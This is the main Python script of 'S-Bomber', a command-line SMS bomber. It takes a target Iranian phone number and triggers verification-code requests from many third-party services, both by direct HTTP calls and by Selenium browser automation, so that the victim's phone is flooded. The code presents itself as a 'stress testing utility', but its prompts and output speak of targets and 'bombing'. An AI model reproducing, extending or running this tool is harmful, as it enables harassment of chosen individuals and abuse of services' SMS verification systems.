# Github: https://github.com/ibehii
# Telegram: https://T.me/BZHNAM
# e-mail: Behii@tutanota.com
# ____________________________________________

"""Main command-line interface entry point for S-Bomber."""

import argparse
import io
import os
from pathlib import Path
import platform
import shutil
import sys
import tarfile
import time
from typing import Final, Optional
import zipfile

# Graceful terminal color handling
try:
    from colorama import Fore, Style
except ImportError:
    class Fore:  # type: ignore[no-redef]
        RED = "\033[31m"
        GREEN = "\033[32m"
        YELLOW = "\033[33m"
        BLUE = "\033[34m"
        MAGENTA = "\033[35m"
        CYAN = "\033[36m"
        WHITE = "\033[37m"
        RESET = "\033[39m"

    class Style:  # type: ignore[no-redef]
        RESET_ALL = "\033[0m"
        BRIGHT = "\033[1m"

try:
    import pyfiglet
except ImportError:
    pyfiglet = None  # type: ignore[assignment]

try:
    from Rcolor import standard_fg
except ImportError:
    def standard_fg(display_text: str) -> str:
        return display_text

try:
    import requests
    from requests import Response
except ImportError:
    requests = None  # type: ignore[assignment]
    Response = None  # type: ignore[assignment, misc]

from lib import IranianSMS, IranianWebSMS, bomb_exceptions

PERSIAN_AND_ARABIC_DIGIT_TRANSLATION_TABLE: Final[dict[int, int]] = str.maketrans(
    "۰۱۲۳۴۵۶۷۸۹٠١٢٣٤٥٦٧٨٩",
    "01234567890123456789",
)


def clear_terminal_screen() -> None:
    """Clear the terminal screen safely across POSIX and Windows systems when attached to a TTY."""
    if not sys.stdout.isatty():
        return
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")


def normalize_iranian_phone_number(raw_phone_input: str) -> str:
    """Validate and normalize Iranian mobile phone numbers to standard 11-digit format.

    Supported input formats:
    - '09123456789' (standard domestic format, 11 digits)
    - '989123456789' (international format without plus, 12 digits)
    - '+989123456789' (international format with plus, 13 characters)
    - '9123456789' (trunk-less format, 10 digits)
    - '۰۹۱۲۳۴۵۶۷۸۹' or '٠٩١٢٣٤٥٦٧٨٩' (Persian / Arabic numerals)

    Parameters
    ----------
    raw_phone_input : str
        The raw phone number entered by the user.

    Returns
    -------
    str
        Normalized 11-digit mobile number beginning with '09'.

    Raises
    ------
    ValueError
        If the input is empty, non-numeric, or does not match an Iranian mobile pattern.
    """
    cleaned_phone_number: str = (
        raw_phone_input.strip()
        .translate(PERSIAN_AND_ARABIC_DIGIT_TRANSLATION_TABLE)
        .replace("+", "")
        .replace(" ", "")
        .replace("-", "")
    )

    if not cleaned_phone_number:
        raise ValueError("Phone number cannot be empty.")

    if not cleaned_phone_number.isnumeric():
        raise ValueError("Phone number must contain digits only.")

    # Format: +989... or 989... (12 digits)
    if cleaned_phone_number.startswith("98"):
        if not cleaned_phone_number.startswith("989"):
            raise ValueError(
                "Invalid Iranian mobile prefix. Iranian mobile numbers begin with 989."
            )
        if len(cleaned_phone_number) != 12:
            raise ValueError(
                f"Expected 12 digits for international format (98...), got {len(cleaned_phone_number)}."
            )
        return "0" + cleaned_phone_number[2:]

    # Format: 09... (11 digits)
    if cleaned_phone_number.startswith("09"):
        if len(cleaned_phone_number) != 11:
            raise ValueError(
                f"Expected 11 digits for domestic format (09...), got {len(cleaned_phone_number)}."
            )
        return cleaned_phone_number

    # Format: 9... (10 digits)
    if cleaned_phone_number.startswith("9"):
        if len(cleaned_phone_number) != 10:
            raise ValueError(
                f"Expected 10 digits without trunk zero, got {len(cleaned_phone_number)}."
            )
        return "0" + cleaned_phone_number

    raise ValueError(
        "Invalid phone number. Iranian mobile numbers must start with 09, 989, or +989."
    )


def display_startup_banner() -> None:
    """Render startup banner and author attribution to stdout."""
    current_script_directory: Path = Path(__file__).parent.resolve()
    banner_text: str = ""

    if pyfiglet is not None:
        local_bundled_font: Path = current_script_directory / "ANSI Shadow.flf"
        pyfiglet_fonts_directory: Path = (
            Path(pyfiglet.__file__).parent.resolve() / "fonts"
        )
        custom_font_file: Path = pyfiglet_fonts_directory / "ANSI Shadow.flf"

        if not custom_font_file.exists() and local_bundled_font.exists():
            try:
                shutil.copy(local_bundled_font, custom_font_file)
            except (OSError, PermissionError):
                pass

        try:
            if custom_font_file.exists():
                banner_text = pyfiglet.figlet_format("S-Bomber", font="ANSI Shadow")
            else:
                banner_text = pyfiglet.figlet_format("S-Bomber", font="standard")
        except Exception:
            banner_text = ""

    if not banner_text:
        banner_text = (
            "  ____      ____                  _               \n"
            " / ___|    | __ )  ___  _ __ ___ | |__   ___ _ __ \n"
            " \\___ \\ ___|  _ \\ / _ \\| '_ ` _ \\| '_ \\ / _ \\ '__|\n"
            "  ___) |___| |_) | (_) | | | | | | |_) |  __/ |   \n"
            " |____/    |____/ \\___/|_| |_| |_|_.__/ \\___|_|   \n"
        )

    print(standard_fg(banner_text))
    print(
        Fore.MAGENTA
        + "- My telegram : t.me/BZHNAM -\n"
        + "- My github   : https://github.com/ibehii -\n\n"
        + Fore.YELLOW
        + "------------ # v1.1.0 # ------------  \n"
        + Fore.RESET
    )


def resolve_and_download_geckodriver(destination_directory: Path) -> Optional[Path]:
    """Identify host platform and download matching geckodriver binary.

    Parameters
    ----------
    destination_directory : Path
        Directory where geckodriver binary will be placed.

    Returns
    -------
    Optional[Path]
        Path to extracted executable if successful, None otherwise.
    """
    if requests is None:
        print(Fore.RED + "The requests package is required to download geckodriver." + Fore.RESET)
        return None

    current_operating_system: str = platform.system()
    current_architecture: str = platform.machine().lower()

    platform_download_urls: dict[tuple[str, str], str] = {
        ("Linux", "x86_64"): (
            "https://github.com/mozilla/geckodriver/releases/download/v0.36.0/geckodriver-v0.36.0-linux64.tar.gz"
        ),
        ("Linux", "arm64"): (
            "https://github.com/mozilla/geckodriver/releases/download/v0.36.0/geckodriver-v0.36.0-linux-aarch64.tar.gz"
        ),
        ("Linux", "aarch64"): (
            "https://github.com/mozilla/geckodriver/releases/download/v0.36.0/geckodriver-v0.36.0-linux-aarch64.tar.gz"
        ),
        ("Darwin", "x86_64"): (
            "https://github.com/mozilla/geckodriver/releases/download/v0.36.0/geckodriver-v0.36.0-macos.tar.gz"
        ),
        ("Darwin", "arm64"): (
            "https://github.com/mozilla/geckodriver/releases/download/v0.36.0/geckodriver-v0.36.0-macos-aarch64.tar.gz"
        ),
        ("Windows", "x86_64"): (
            "https://github.com/mozilla/geckodriver/releases/download/v0.36.0/geckodriver-v0.36.0-win64.zip"
        ),
        ("Windows", "x86"): (
            "https://github.com/mozilla/geckodriver/releases/download/v0.36.0/geckodriver-v0.36.0-win32.zip"
        ),
        ("Windows", "arm64"): (
            "https://github.com/mozilla/geckodriver/releases/download/v0.36.0/geckodriver-v0.36.0-win-aarch64.zip"
        ),
    }

    # Normalize architecture key
    if current_architecture in ("x86_64", "amd64"):
        normalized_architecture: str = "x86_64"
    elif current_architecture in ("aarch64", "arm64"):
        normalized_architecture = "arm64"
    elif current_architecture in ("x86", "i386", "i686"):
        normalized_architecture = "x86"
    else:
        normalized_architecture = current_architecture

    target_platform_key: tuple[str, str] = (
        current_operating_system,
        normalized_architecture,
    )
    download_url: Optional[str] = platform_download_urls.get(target_platform_key)

    if download_url is None:
        print(
            Fore.RED
            + f"Unsupported platform: {current_operating_system} {current_architecture}. "
            + "Please install geckodriver manually."
            + Fore.RESET
        )
        return None

    executable_name: str = "geckodriver.exe" if current_operating_system == "Windows" else "geckodriver"
    final_executable_path: Path = destination_directory / executable_name

    try:
        print(Fore.YELLOW + f"Downloading geckodriver from {download_url}..." + Fore.RESET)
        network_response: Response = requests.get(download_url, timeout=45.0)
        network_response.raise_for_status()
        archive_bytes: io.BytesIO = io.BytesIO(network_response.content)

        if download_url.endswith(".tar.gz"):
            with tarfile.open(fileobj=archive_bytes, mode="r:gz") as tar_archive:
                for member_entry in tar_archive.getmembers():
                    if member_entry.name.endswith("geckodriver"):
                        extracted_file = tar_archive.extractfile(member_entry)
                        if extracted_file is not None:
                            with open(final_executable_path, "wb") as target_binary:
                                shutil.copyfileobj(extracted_file, target_binary)
                        break
        elif download_url.endswith(".zip"):
            with zipfile.ZipFile(archive_bytes) as zip_archive:
                for zip_entry in zip_archive.namelist():
                    if zip_entry.endswith("geckodriver.exe"):
                        with zip_archive.open(zip_entry) as source_binary, open(
                            final_executable_path, "wb"
                        ) as target_binary:
                            shutil.copyfileobj(source_binary, target_binary)
                        break

        if final_executable_path.exists():
            final_executable_path.chmod(0o755)
            print(Fore.GREEN + f"Successfully installed geckodriver at {final_executable_path}" + Fore.RESET)
            return final_executable_path

    except Exception as download_failure:
        print(Fore.RED + f"Failed to download geckodriver: {download_failure}" + Fore.RESET)

    return None


def run_http_sms_bomber(
    target_phone_number: str,
    request_interval_seconds: float = 1.6,
) -> int:
    """Execute verification code requests through direct HTTP API endpoints.

    Parameters
    ----------
    target_phone_number : str
        Normalized 11-digit Iranian mobile number.
    request_interval_seconds : float, optional
        Delay in seconds between requests, by default 1.6.

    Returns
    -------
    int
        Total number of successfully initiated requests.
    """
    successful_requests_count: int = 0

    with IranianSMS(target_phone_number) as iranian_sms_sender:
        provider_service_names: list[str] = iranian_sms_sender.get_service_methods()

        for provider_service_name in provider_service_names:
            provider_service_callable = getattr(
                iranian_sms_sender, provider_service_name
            )
            try:
                provider_service_callable()
            except ConnectionError:
                print(
                    Fore.RED
                    + "[-] - "
                    + f"Couldn't send Verification code through {provider_service_name}! Check Your Internet Connection."
                    + Fore.RESET
                )
            except bomb_exceptions.BombClientError:
                print(
                    Fore.RED
                    + "[-] - "
                    + f"Couldn't send Verification code through {provider_service_name}! Request was rejected or rate limited."
                    + Fore.RESET
                )
            except bomb_exceptions.BombServerError:
                print(
                    Fore.RED
                    + "[-] - "
                    + f"Couldn't send Verification code through {provider_service_name}! There is a problem with remote server."
                    + Fore.RESET
                )
            else:
                successful_requests_count += 1
                print(
                    Fore.YELLOW
                    + "[+]"
                    + Fore.MAGENTA
                    + " - "
                    + Fore.GREEN
                    + f"Verification code sent through {provider_service_name} Successfully"
                    + Fore.RESET
                )

            time.sleep(request_interval_seconds)

    return successful_requests_count


def run_browser_sms_bomber(
    target_phone_number: str,
    request_interval_seconds: float = 1.6,
) -> int:
    """Execute browser-dependent verification code requests using Selenium.

    Parameters
    ----------
    target_phone_number : str
        Normalized 11-digit Iranian mobile number.
    request_interval_seconds : float, optional
        Delay in seconds between browser actions, by default 1.6.

    Returns
    -------
    int
        Total number of successfully initiated browser requests.
    """
    successful_browser_requests_count: int = 0
    current_workspace_directory: Path = Path(__file__).parent.resolve()

    try:
        from selenium.common.exceptions import WebDriverException
    except ImportError:
        print(
            Fore.RED
            + 'Selenium is missing. Run "pip install -r requirements.txt" to enable browser automation.'
            + Fore.RESET
        )
        return 0

    try:
        with IranianWebSMS(target_phone_number) as web_sms_sender:
            browser_service_names: list[str] = web_sms_sender.get_service_methods()

            for browser_service_name in browser_service_names:
                browser_service_callable = getattr(
                    web_sms_sender, browser_service_name
                )
                try:
                    is_operation_successful: bool = bool(browser_service_callable())
                except Exception as execution_error:
                    is_operation_successful = False

                if is_operation_successful:
                    successful_browser_requests_count += 1
                    print(
                        Fore.YELLOW
                        + "[+]"
                        + Fore.MAGENTA
                        + " - "
                        + Fore.GREEN
                        + f"Browser verification code sent through {browser_service_name} Successfully"
                        + Fore.RESET
                    )
                else:
                    print(
                        Fore.RED
                        + "[-] - "
                        + f"Couldn't send browser verification code through {browser_service_name}!"
                        + Fore.RESET
                    )

                time.sleep(request_interval_seconds)

    except ImportError as import_error:
        print(Fore.RED + f"Browser component unavailable: {import_error}" + Fore.RESET)
    except WebDriverException as webdriver_error:
        print(
            Fore.RED
            + f"Browser webdriver error: {webdriver_error}.\n"
            + "Ensure Firefox is installed and geckodriver is present."
            + Fore.RESET
        )
        try:
            user_permission_input: str = input(
                Fore.GREEN + "Would you like to install geckodriver automatically? [Y/n] " + Fore.RESET
            )
        except (KeyboardInterrupt, EOFError):
            print(Fore.YELLOW + "\nGeckodriver installation skipped." + Fore.RESET)
            return 0

        if user_permission_input.strip().lower() in ("y", "yes", ""):
            downloaded_driver_path = resolve_and_download_geckodriver(
                current_workspace_directory
            )
            if downloaded_driver_path is not None:
                print(
                    Fore.GREEN
                    + "Geckodriver is now installed. Re-running browser services..."
                    + Fore.RESET
                )
                return run_browser_sms_bomber(
                    target_phone_number, request_interval_seconds
                )

    return successful_browser_requests_count


def parse_command_line_arguments(
    command_line_arguments: Optional[list[str]] = None,
) -> argparse.Namespace:
    """Parse optional command-line arguments for automated or custom execution.

    Parameters
    ----------
    command_line_arguments : Optional[list[str]], optional
        Explicit argument list (useful for testing), by default None (parses sys.argv[1:]).

    Returns
    -------
    argparse.Namespace
        Parsed CLI options and flags.
    """
    argument_parser = argparse.ArgumentParser(
        description="S-Bomber: SMS provider verification benchmark and stress testing utility.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    argument_parser.add_argument(
        "-p",
        "--phone",
        type=str,
        default=None,
        help="Target Iranian phone number (e.g., 09123456789, +989123456789, or Persian digits).",
    )
    argument_parser.add_argument(
        "-i",
        "--interval",
        type=float,
        default=1.6,
        help="Delay in seconds between consecutive requests.",
    )
    argument_parser.add_argument(
        "-t",
        "--timeout",
        type=float,
        default=10.0,
        help="HTTP request timeout in seconds.",
    )
    argument_parser.add_argument(
        "--no-browser",
        action="store_true",
        help="Skip browser automation phase and run only HTTP API services.",
    )
    argument_parser.add_argument(
        "--only-browser",
        action="store_true",
        help="Run only browser automation phase and skip HTTP API services.",
    )
    return argument_parser.parse_args(command_line_arguments)


def main() -> None:
    """Primary application workflow."""
    parsed_arguments: argparse.Namespace = parse_command_line_arguments()
    clear_terminal_screen()
    display_startup_banner()

    target_phone_number: str = ""
    if parsed_arguments.phone:
        try:
            target_phone_number = normalize_iranian_phone_number(parsed_arguments.phone)
        except ValueError as validation_error:
            sys.exit(Fore.RED + f"Validation error: {validation_error}" + Fore.RESET)
    else:
        try:
            user_input_phone: str = input(
                Fore.GREEN
                + "- Enter your target phone number (e.g: 989126543210 or 09126543210)-> "
                + Fore.RESET
            )
            target_phone_number = normalize_iranian_phone_number(user_input_phone)
        except ValueError as validation_error:
            sys.exit(Fore.RED + f"Validation error: {validation_error}" + Fore.RESET)
        except (KeyboardInterrupt, EOFError):
            sys.exit(Fore.YELLOW + "\nOperation aborted by user." + Fore.RESET)

    print(Fore.RED + "Note: For best results check README.md file" + Fore.RESET)
    print(Fore.BLUE + f"STARTING THE OPERATION FOR {target_phone_number} ..." + Fore.RESET)

    try:
        if not parsed_arguments.only_browser:
            # Phase 1: Direct HTTP SMS Dispatching
            http_success_count: int = run_http_sms_bomber(
                target_phone_number=target_phone_number,
                request_interval_seconds=parsed_arguments.interval,
            )
            print(
                Fore.CYAN
                + f"HTTP bombing completed. Dispatched: {http_success_count} requests."
                + Fore.RESET
            )

        if not parsed_arguments.no_browser:
            # Phase 2: Browser-dependent SMS Dispatching
            browser_success_count: int = run_browser_sms_bomber(
                target_phone_number=target_phone_number,
                request_interval_seconds=parsed_arguments.interval,
            )
            print(
                Fore.CYAN
                + f"Browser bombing completed. Dispatched: {browser_success_count} requests."
                + Fore.RESET
            )

    except KeyboardInterrupt:
        print(Fore.YELLOW + "\nOperation stopped by user." + Fore.RESET)


if __name__ == "__main__":
    main()